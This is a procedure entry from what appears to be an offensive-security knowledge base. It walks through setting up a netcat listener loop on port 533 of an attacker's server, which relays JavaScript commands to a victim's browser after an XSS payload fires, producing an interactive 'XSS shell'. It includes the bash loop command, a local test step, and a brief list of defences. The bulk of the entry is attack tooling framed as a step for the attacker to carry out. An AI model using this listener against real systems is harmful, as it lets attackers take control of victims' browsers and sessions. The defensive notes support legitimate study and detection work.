---
id: proc-uuid-4
tags:
  - xss-shell
  - listener-setup
type: procedure
tools:
  - '[[tools/netcat]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/netcat-xss-shell-listener]]'
verified: false
platforms:
  - Linux
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-13T23:52:43.731Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Set Up Netcat Listener for XSS Shell

## Summary

This procedure configures a netcat-based listener on the attacker's server to handle incoming connections from the victim's browser and facilitate interactive JS command sending.

## Description

After the weaponized payload triggers a script load, the external script (not detailed here) can connect back via WebSocket or fetch to netcat. The loop reads attacker input and pipes JS commands to the victim. Target port: 533. Outcome: Interactive prompt for shell commands.

## Requirements

1. Netcat installed on attacker machine
2. Firewall allowing inbound on port 533
3. Public IP for victim reachability

## Defense

Defensive measures and detection strategies:

- Block unexpected inbound connections on non-standard ports
- Monitor for nc processes piping to ports
- Browser sandboxing to limit external connects

## Objectives

1. Listen for victim connection
2. Enable command piping
3. Maintain interactive session

## Instructions

### Step 1: Launch Listener Loop

**Context**: Create a bash loop to persistently listen and relay inputs.

**Command** ([[commands/netcat-xss-shell-listener]]):

```bash
while :; do printf "ZephrFishHackerOne>$ "; read c; echo $c | nc -vvlp 533 >/dev/null; done
```

> Runs nc in verbose listen mode on 533, reads input, pipes to connection. Expected: Prompt ready, verbose logs on connect.

### Step 2: Validate Listener

**Context**: Test locally if needed.

**Command** (Test connect):

From another terminal: echo 'test' | nc localhost 533

> Success: No errors, ready for remote.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used

- [[commands/netcat-xss-shell-listener]]

## Tools Used

- [[tools/netcat]]

## Tags

- [[listener]]
- [[shell]]
